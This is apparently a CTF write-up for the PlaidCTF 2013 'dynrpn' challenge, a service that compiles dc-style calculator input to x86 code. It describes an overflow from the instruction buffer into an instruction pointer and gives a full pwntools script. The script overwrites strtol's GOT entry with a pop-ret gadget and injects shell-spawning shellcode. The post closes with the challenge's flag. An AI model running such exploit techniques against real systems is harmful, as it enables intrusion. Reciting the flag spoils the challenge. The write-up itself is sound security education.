---
title: dynrpn - PlaidCTF 2013
author: IdolfHatler
layout: post
published: true
date: 2013-05-06 22:55:10
---

Challenge description:

> <pre>`dc` runs too slowly for my tastes.dynrpn running at 107.22.129.12:49630</pre>

This service was a clone of the dc tool, which is a stack based calculator. It
parses an entered line, compiles it to x86 floating point instructions and then
runs it. It does this by allocating a struct using mmap(2). The
struct looks something like this:

```c
struct {
    char instr_arr[2000];
    char spill[2000];
    char frstor_data[108];
    char *instr_pointer;
    dword field_1010;
    dword will_underflow;
}
```

The instr_arr is used for the compiled x86-instructions. The only other relevant
field is the instr_pointer, which is supposed to point into the instr_arr.

Our exploit works by overflowing from the instr_arr into the instr_pointer. We
set the instr_pointer to just before the strtol in the global offset table, so
that we can redirect it to a pop-ret gadget:

```python
from pwn import *
context('i386', 'linux')
HOST = '107.22.129.12'
PORT = 49630

r = rop.ROP("./dynrpn-55ac9afa75b1cbad2daa431f1d853079d5983eed")
p = process("./dynrpn-55ac9afa75b1cbad2daa431f1d853079d5983eed", timeout=None)
#p = remote(HOST, PORT)

popret = r._gadgets['popret'][1][0]

code  = "0 "                             # push a 0 to the stack
code += "0*"*291                         # create a lot of instructions
code += "@"*9                            # fix the alignment
code += str(r.got['strtol']-16)          # overwrite with address of .plt.strtol
code += " " + str(popret)                # overwrite .plt.strtol with a popret
code += " " + asm(shellcode.sh())
p.sendafter('dynrpn', code + "\n")
p.interactive()
```

Key: d0ubl3_ra1nb0w_fl0ting_in_the_sky
